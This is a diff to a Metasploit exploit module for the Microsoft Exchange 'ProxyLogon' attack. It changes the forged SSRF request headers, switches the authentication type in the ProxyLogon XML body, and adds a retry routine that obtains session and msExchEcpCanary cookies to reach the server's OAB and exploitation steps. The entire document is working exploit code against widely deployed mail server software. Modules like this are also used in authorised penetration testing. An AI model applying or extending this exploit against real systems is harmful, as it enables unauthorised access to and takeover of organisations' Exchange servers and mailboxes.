@@ -146,7 +146,10 @@ class MetasploitModule < Msf::Exploit::Remote
       data,
       exploit_info[2],
       'application/json; charset=utf-8',
-      { 'msExchLogonMailbox' => exploit_info[1] }
+      { 
+        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
+        'msExchTargetMailbox' => patch_sid(exploit_info[1])
+      }
     )
     return '' if response.code != 200
 
@@ -251,7 +254,10 @@ class MetasploitModule < Msf::Exploit::Remote
       data,
       session,
       'application/json; charset=utf-8',
-      { 'msExchLogonMailbox' => sid }
+      { 
+        'msExchLogonMailbox' => patch_sid(sid),
+        'msExchTargetMailbox' => patch_sid(sid)
+      }
     )
 
     if response.code == 200
@@ -267,7 +273,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def request_proxylogon(server_name, sid)
-    data = "<r at=\"NTLM\" ln=\"#{datastore['EMAIL'].split('@')[0]}\"><s>#{patch_sid(sid)}</s></r>"
+    data = "<r at=\"Negotiate\" ln=\"#{datastore['EMAIL'].split('@')[0]}\"><s>#{sid}</s></r>"
 
     session_id = ''
     canary = ''
@@ -278,14 +284,15 @@ class MetasploitModule < Msf::Exploit::Remote
       data,
       '',
       'text/xml; charset=utf-8',
-      { 'msExchLogonMailbox' => sid }
+      {
+        'msExchLogonMailbox' => patch_sid(sid),
+        'msExchTargetMailbox' => patch_sid(sid)
+      }
     )
     if response.code == 241
       session_id = response.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
       canary = response.get_cookies.scan(/msExchEcpCanary=([\w\-_.]+);*/).flatten[0] # coin coin coin ...
     end
-    fail_with(Failure::Unknown, 'No \'ASP.NET_SessionId\' was found') if session_id.empty?
-    fail_with(Failure::Unknown, 'No \'msExchEcpCanary\' was found') if canary.empty?
 
     [session_id, canary]
   end
@@ -314,17 +321,8 @@ class MetasploitModule < Msf::Exploit::Remote
     sid = request_mapi(server_name, legacy_dn, server_id)
     print_status(" * sid: #{sid} (#{datastore['EMAIL']})")
 
-    # request cookies (session and canary)
-    print_status(message('Sending ProxyLogon request'))
-    session_id, canary = request_proxylogon(server_name, sid)
-
-    print_status(" * ASP.NET_SessionId: #{session_id}")
-    print_status(" * msExchEcpCanary: #{canary}")
-    session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
-
-    # get OAB id
-    oab_id = request_oab(server_name, sid, session, canary)
-    print_status(" * OAB id: #{oab_id[1]} (#{oab_id[0]})")
+    # search oab
+    sid, session, canary, oab_id = search_oab(server_name, sid)
 
     [server_name, sid, session, canary, oab_id]
   end
@@ -360,6 +358,28 @@ class MetasploitModule < Msf::Exploit::Remote
     end
 
     [input_name, remote_file]
+  end
+
+  def search_oab(server_name, sid)
+    # request cookies (session and canary)
+    print_status(message('Sending ProxyLogon request'))
+    session_id, canary = request_proxylogon(server_name, patch_sid(sid))
+    patch_sid(sid) if canary
+    unless canary
+      session_id, canary = request_proxylogon(server_name, sid)
+    end
+    fail_with(Failure::Unknown, 'No \'ASP.NET_SessionId\' was found') if session_id.empty?
+    fail_with(Failure::Unknown, 'No \'msExchEcpCanary\' was found') if canary.empty?
+
+    print_status(" * ASP.NET_SessionId: #{session_id}")
+    print_status(" * msExchEcpCanary: #{canary}")
+    session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
+
+    # get OAB id
+    oab_id = request_oab(server_name, sid, session, canary)
+    print_status(" * OAB id: #{oab_id[1]} (#{oab_id[0]})")
+    
+    return [sid, session, canary, oab_id]
   end
 
   def send_http(method, ssrf, data = '', cookie = '', ctype = '', headers = '')
@@ -427,7 +447,10 @@ class MetasploitModule < Msf::Exploit::Remote
       data,
       exploit_info[2],
       'application/json; charset=utf-8',
-      { 'msExchLogonMailbox' => exploit_info[1] }
+      { 
+        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
+        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
+      }
     )
     return '' if response.code != 200
 
